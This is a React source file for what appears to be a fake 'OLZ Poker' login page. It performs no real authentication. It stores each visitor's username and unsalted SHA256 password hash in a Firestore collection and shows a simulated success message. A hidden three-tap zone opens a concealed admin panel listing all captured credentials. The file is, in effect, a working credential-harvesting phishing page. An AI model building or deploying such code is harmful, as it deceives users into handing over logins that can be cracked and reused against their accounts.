import React, { useState, useEffect, useRef } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { db } from './firebase';
import { collection, addDoc, onSnapshot, query, orderBy, getDocFromServer, doc } from 'firebase/firestore';
import CryptoJS from 'crypto-js';
import { User, Lock, Shield, Eye, EyeOff, Clock, ChevronRight } from 'lucide-react';

// Error handling helper as per instructions
enum OperationType {
  CREATE = 'create',
  UPDATE = 'update',
  DELETE = 'delete',
  LIST = 'list',
  GET = 'get',
  WRITE = 'write',
}

interface FirestoreErrorInfo {
  error: string;
  operationType: OperationType;
  path: string | null;
}

function handleFirestoreError(error: unknown, operationType: OperationType, path: string | null) {
  const errInfo: FirestoreErrorInfo = {
    error: error instanceof Error ? error.message : String(error),
    operationType,
    path
  };
  console.error('Firestore Error: ', JSON.stringify(errInfo));
}

export default function App() {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [adminVisible, setAdminVisible] = useState(false);
  const [tapCount, setTapCount] = useState(0);
  const [logins, setLogins] = useState<any[]>([]);
  const tapTimeoutRef = useRef<NodeJS.Timeout | null>(null);

  // Test connection on boot
  useEffect(() => {
    async function testConnection() {
      try {
        await getDocFromServer(doc(db, 'test', 'connection'));
      } catch (error) {
        if (error instanceof Error && error.message.includes('the client is offline')) {
          console.error("Please check your Firebase configuration.");
        }
      }
    }
    testConnection();
  }, []);

  // Hidden Admin Panel Trigger (3 taps in 1 second)
  const handleSecretTap = () => {
    setTapCount(prev => {
      const newCount = prev + 1;
      if (newCount >= 3) {
        setAdminVisible(true);
        return 0;
      }
      return newCount;
    });

    if (tapTimeoutRef.current) clearTimeout(tapTimeoutRef.current);
    tapTimeoutRef.current = setTimeout(() => {
      setTapCount(0);
    }, 1000);
  };

  // Real-time data for admin panel
  useEffect(() => {
    if (!adminVisible) return;

    const q = query(collection(db, 'logins'), orderBy('timestamp', 'desc'));
    const unsubscribe = onSnapshot(q, (snapshot) => {
      const data = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
      setLogins(data);
    }, (error) => {
      handleFirestoreError(error, OperationType.LIST, 'logins');
    });

    return () => unsubscribe();
  }, [adminVisible]);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!username || !password) {
      alert('Please enter both username and password');
      return;
    }

    setLoading(true);
    try {
      // Hashing password using SHA256
      const passwordHash = CryptoJS.SHA256(password).toString();
      
      await addDoc(collection(db, 'logins'), {
        username,
        passwordHash,
        timestamp: new Date().toISOString(),
      });

      // Simulate a successful "login" redirect or message
      alert('Login successful! Welcome to OLZ Poker.');
      setUsername('');
      setPassword('');
    } catch (error) {
      handleFirestoreError(error, OperationType.CREATE, 'logins');
      alert('An error occurred. Please try again.');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-[#0f0f1a] text-white font-sans selection:bg-red-500/30">
      {/* Secret Tap Zone */}
      <div 
        className="fixed top-0 left-0 w-full h-16 z-50 cursor-default"
        onClick={handleSecretTap}
      />

      <div className="flex items-center justify-center min-h-screen p-4">
        <AnimatePresence mode="wait">
          {!adminVisible ? (
            <motion.div
              key="login"
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, scale: 0.95 }}
              className="w-full max-w-md bg-[#1a1a2e] border border-white/10 rounded-3xl p-8 shadow-2xl relative overflow-hidden"
            >
              {/* Decorative background element */}
              <div className="absolute -top-24 -right-24 w-48 h-48 bg-red-600/10 rounded-full blur-3xl" />
              <div className="absolute -bottom-24 -left-24 w-48 h-48 bg-red-600/10 rounded-full blur-3xl" />

              <div className="text-center mb-8 relative">
                <div className="inline-flex items-center justify-center w-16 h-16 bg-red-600 rounded-2xl mb-4 shadow-lg shadow-red-600/20">
                  <Shield className="text-white w-8 h-8" />
                </div>
                <h1 className="text-3xl font-bold tracking-tight">OLZ POKER</h1>
                <p className="text-gray-400 text-sm mt-2">Enter your credentials to access the table</p>
              </div>

              <form onSubmit={handleLogin} className="space-y-6 relative">
                <div className="space-y-2">
                  <label className="text-xs font-semibold text-gray-400 uppercase tracking-wider ml-1">Username</label>
                  <div className="relative">
                    <User className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 w-5 h-5" />
                    <input
                      type="text"
                      value={username}
                      onChange={(e) => setUsername(e.target.value)}
                      placeholder="poker_king_99"
                      className="w-full bg-[#0f0f1a] border border-white/5 rounded-2xl py-4 pl-12 pr-4 focus:outline-none focus:border-red-600/50 transition-colors placeholder:text-gray-600"
                    />
                  </div>
                </div>

                <div className="space-y-2">
                  <label className="text-xs font-semibold text-gray-400 uppercase tracking-wider ml-1">Password</label>
                  <div className="relative">
                    <Lock className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 w-5 h-5" />
                    <input
                      type={showPassword ? "text" : "password"}
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      placeholder="••••••••"
                      className="w-full bg-[#0f0f1a] border border-white/5 rounded-2xl py-4 pl-12 pr-12 focus:outline-none focus:border-red-600/50 transition-colors placeholder:text-gray-600"
                    />
                    <button
                      type="button"
                      onClick={() => setShowPassword(!showPassword)}
                      className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-300 transition-colors"
                    >
                      {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
                    </button>
                  </div>
                </div>

                <button
                  type="submit"
                  disabled={loading}
                  className="w-full bg-red-600 hover:bg-red-700 disabled:bg-red-800/50 text-white font-bold py-4 rounded-2xl transition-all active:scale-[0.98] shadow-lg shadow-red-600/20 flex items-center justify-center gap-2 group"
                >
                  {loading ? (
                    <div className="w-6 h-6 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                  ) : (
                    <>
                      LOGIN NOW
                      <ChevronRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
                    </>
                  )}
                </button>
              </form>

              <div className="mt-8 text-center">
                <p className="text-xs text-gray-500">
                  By logging in, you agree to our <span className="text-gray-400 underline cursor-pointer">Terms of Service</span>
                </p>
              </div>
            </motion.div>
          ) : (
            <motion.div
              key="admin"
              initial={{ opacity: 0, scale: 0.95 }}
              animate={{ opacity: 1, scale: 1 }}
              className="w-full max-w-4xl bg-[#1a1a2e] border border-white/10 rounded-3xl p-8 shadow-2xl"
            >
              <div className="flex items-center justify-between mb-8">
                <div>
                  <h2 className="text-2xl font-bold flex items-center gap-2">
                    <Shield className="text-red-600" />
                    ADMIN CONTROL PANEL
                  </h2>
                  <p className="text-gray-400 text-sm">Real-time login activity monitor</p>
                </div>
                <button
                  onClick={() => setAdminVisible(false)}
                  className="bg-white/5 hover:bg-white/10 px-4 py-2 rounded-xl text-sm transition-colors"
                >
                  Close Panel
                </button>
              </div>

              <div className="overflow-x-auto">
                <table className="w-full text-left border-collapse">
                  <thead>
                    <tr className="border-b border-white/5">
                      <th className="pb-4 font-semibold text-gray-400 text-xs uppercase tracking-wider">Username</th>
                      <th className="pb-4 font-semibold text-gray-400 text-xs uppercase tracking-wider">Password Hash</th>
                      <th className="pb-4 font-semibold text-gray-400 text-xs uppercase tracking-wider">Time</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-white/5">
                    {logins.length === 0 ? (
                      <tr>
                        <td colSpan={3} className="py-8 text-center text-gray-500 italic">
                          No login records found yet...
                        </td>
                      </tr>
                    ) : (
                      logins.map((login) => (
                        <tr key={login.id} className="group hover:bg-white/[0.02] transition-colors">
                          <td className="py-4 pr-4">
                            <span className="font-medium text-red-400">{login.username}</span>
                          </td>
                          <td className="py-4 pr-4">
                            <code className="text-[10px] bg-black/30 px-2 py-1 rounded text-gray-400 break-all">
                              {login.passwordHash}
                            </code>
                          </td>
                          <td className="py-4 whitespace-nowrap">
                            <div className="flex items-center gap-2 text-gray-400 text-sm">
                              <Clock size={14} />
                              {new Date(login.timestamp).toLocaleString()}
                            </div>
                          </td>
                        </tr>
                      ))
                    )}
                  </tbody>
                </table>
              </div>
            </motion.div>
          )}
        </AnimatePresence>
      </div>
    </div>
  );
}
